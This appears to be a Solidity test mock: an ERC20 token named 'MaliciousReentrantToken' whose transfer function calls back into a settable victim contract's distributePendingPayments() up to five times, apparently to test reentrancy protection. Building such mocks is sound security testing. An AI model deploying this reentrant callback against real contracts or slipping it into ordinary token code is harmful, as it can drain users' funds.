// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MaliciousReentrantToken is ERC20 {
    address public victim;
    uint256 public attackCount;
    
    constructor() ERC20("Malicious", "MAL") {
        _mint(msg.sender, 1000000 * 10**18);
    }
    
    function setVictim(address _victim) external {
        victim = _victim;
    }
    
    function transfer(address to, uint256 amount) public override returns (bool) {
        // Before transfer, try to reenter victim
        if (victim != address(0) && attackCount < 5) {
            attackCount++;
            // Attempt reentrancy
            (bool success, ) = victim.call(abi.encodeWithSignature("distributePendingPayments()"));
            // Continue regardless
        }
        
        return super.transfer(to, amount);
    }
}